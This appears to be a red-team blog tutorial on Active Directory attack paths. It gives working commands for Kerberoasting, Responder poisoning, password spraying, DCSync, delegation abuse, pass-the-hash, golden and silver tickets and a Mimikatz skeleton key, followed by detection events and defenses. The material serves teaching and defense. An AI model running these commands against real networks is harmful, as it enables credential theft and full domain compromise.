---
title: "Active Directory Attack Paths: A Red Team Perspective"
date: 2024-12-12T10:00:00+00:00
draft: false
author: "Mahmoud Adel"
tags:
  - Active Directory
  - Red Team
  - Penetration Testing
  - Windows Security
  - Privilege Escalation
  - Kerberos
image: /images/ad-attack-paths.png
description: "Explore common Active Directory attack paths used by red teamers, from initial foothold to domain dominance, with practical examples and detection strategies."
toc: true
---

Active Directory (AD) is the backbone of enterprise Windows environments—and a prime target for attackers. Understanding common attack paths is essential for both offensive and defensive security teams.

> ⚠️ **Disclaimer**: This content is for authorized security testing and educational purposes only. Always obtain proper written authorization.

## The Kill Chain: Initial Access to Domain Admin

A typical AD attack follows this progression:

```
Initial Access → Enumeration → Privilege Escalation → Lateral Movement → Domain Dominance
```

Let's explore each phase.

## Phase 1: Initial Access & Enumeration

### BloodHound: Mapping the Domain

BloodHound visualizes AD relationships and attack paths. First, collect data:

```powershell
# SharpHound collection
.\SharpHound.exe -c All -d domain.local

# Or via PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

Import the ZIP into BloodHound and query for attack paths:

- "Shortest Path to Domain Admins"
- "Find Principals with DCSync Rights"
- "Find Computers with Unconstrained Delegation"

### LDAP Enumeration

```powershell
# Find all Domain Admins
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# Find users with SPN (Kerberoastable)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### SMB Enumeration

```bash
# Enumerate shares
crackmapexec smb 192.168.1.0/24 -u user -p password --shares

# Check for admin access
crackmapexec smb 192.168.1.0/24 -u user -p password --local-auth
```

## Phase 2: Credential Attacks

### Kerberoasting

Extract service account hashes from Kerberos tickets:

```powershell
# Request TGS for all SPNs
Add-Type -AssemblyName System.IdentityModel
$users = Get-ADUser -Filter {ServicePrincipalName -ne "$null"}
foreach ($user in $users) {
    $spn = $user.ServicePrincipalName
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
}
```

```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -outputfile hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

**Why it works**: Service accounts often have weak passwords and high privileges.

### AS-REP Roasting

Target users without Kerberos pre-authentication:

```bash
# Find vulnerable users
GetNPUsers.py domain.local/ -dc-ip 192.168.1.1 -no-pass -usersfile users.txt -format hashcat

# Crack
hashcat -m 18200 asrep-hashes.txt wordlist.txt
```

### LLMNR/NBT-NS Poisoning

Capture NTLMv2 hashes from broadcast name resolution:

```bash
# Responder
sudo responder -I eth0 -wrf

# Captured hashes go to logs
# Crack with hashcat
hashcat -m 5600 captured-hash.txt wordlist.txt
```

### Password Spraying

Test common passwords across many accounts:

```bash
# Spray password against all users
crackmapexec smb 192.168.1.1 -u users.txt -p 'Summer2024!' --continue-on-success

# Watch for lockouts!
```

## Phase 3: Privilege Escalation

### DCSync Attack

If you have replication rights (DS-Replication-Get-Changes), dump all password hashes:

```bash
# Using secretsdump
secretsdump.py domain.local/privileged_user:password@192.168.1.1

# Output includes NTLM hashes for all users including krbtgt
```

**Who has DCSync rights by default?**
- Domain Admins
- Enterprise Admins
- Domain Controllers

### Unconstrained Delegation Abuse

Computers with unconstrained delegation cache TGTs of connecting users:

```powershell
# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Monitor for incoming TGTs (requires admin on that computer)
.\Rubeus.exe monitor /interval:5

# Extract TGT and use for pass-the-ticket
.\Rubeus.exe ptt /ticket:base64_ticket
```

### Constrained Delegation Abuse

Abuse allowed-to-delegate-to rights:

```bash
# Get TGT for the service account
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svc_account:password

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.domain.local
```

### Resource-Based Constrained Delegation (RBCD)

If you control an account that can write to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity:

```powershell
# Add controlled computer to target's RBCD
Set-ADComputer target-computer -PrincipalsAllowedToDelegateToAccount controlled-computer$

# Request ticket impersonating admin
.\Rubeus.exe s4u /user:controlled-computer$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target-computer /ptt
```

## Phase 4: Lateral Movement

### Pass-the-Hash

Use NTLM hash instead of password:

```bash
# PsExec with hash
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:5fbc3d5fce8... administrator@192.168.1.10

# WMI execution
wmiexec.py -hashes :hash administrator@192.168.1.10 "whoami"

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H hash --local-auth
```

### Pass-the-Ticket

Use Kerberos tickets instead of credentials:

```powershell
# Dump tickets from memory
.\Rubeus.exe dump

# Import ticket
.\Rubeus.exe ptt /ticket:base64_ticket

# Now you can access resources as that user
dir \\server\share
```

### Overpass-the-Hash

Convert NTLM hash to Kerberos ticket:

```powershell
# Request TGT using hash
.\Rubeus.exe asktgt /user:administrator /rc4:hash /ptt

# Now use Kerberos for auth
```

## Phase 5: Domain Dominance

### Golden Ticket

With the krbtgt hash, forge tickets for any user:

```bash
# Get krbtgt hash via DCSync
secretsdump.py domain.local/admin:password@dc.domain.local

# Create golden ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass dc.domain.local
```

Golden tickets persist until krbtgt password is changed (twice!).

### Silver Ticket

Forge tickets for specific services without touching the DC:

```bash
# Need service account hash
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/server.domain.local Administrator

# Access only that specific service
```

### Skeleton Key

Inject into LSASS on DC—allows any password to work:

```powershell
# Inject skeleton key (requires DA on DC)
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'

# Now any user can auth with password "mimikatz"
```

## Detection & Defense

| Attack | Detection Method |
|--------|------------------|
| Kerberoasting | Monitor 4769 events with RC4 encryption |
| AS-REP Roast | Monitor 4768 events without pre-auth |
| DCSync | Monitor 4662 events for DS-Replication |
| Golden Ticket | Monitor for TGT with unusual lifetime |
| Pass-the-Hash | Monitor 4624 type 3 with NTLM |
| LLMNR Poisoning | Monitor for LLMNR responses from non-DCs |

### Defensive Recommendations

1. **Disable LLMNR and NBT-NS** globally via GPO
2. **Enable Protected Users group** for sensitive accounts
3. **Implement LAPS** for local admin passwords
4. **Use tiered administration model** (Tier 0/1/2)
5. **Rotate krbtgt password** twice yearly
6. **Monitor with BloodHound** - Defenders can use it too!
7. **Enable Credential Guard** on Windows 10/11
8. **Audit ACLs** - Look for dangerous rights

## Useful Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD relationship mapping |
| Rubeus | Kerberos abuse toolkit |
| Impacket | Python AD exploitation |
| CrackMapExec | Swiss army knife for AD |
| Mimikatz | Credential extraction |
| PowerView | PowerShell AD enumeration |

## Conclusion

Active Directory attacks follow predictable patterns. Understanding these paths helps you:

- **Red Team**: Simulate realistic threats
- **Blue Team**: Know what to monitor and defend
- **Purple Team**: Validate detection capabilities

The key is layered defense—no single control stops all attacks, but together they make an attacker's job significantly harder.

Happy hunting! 🎯
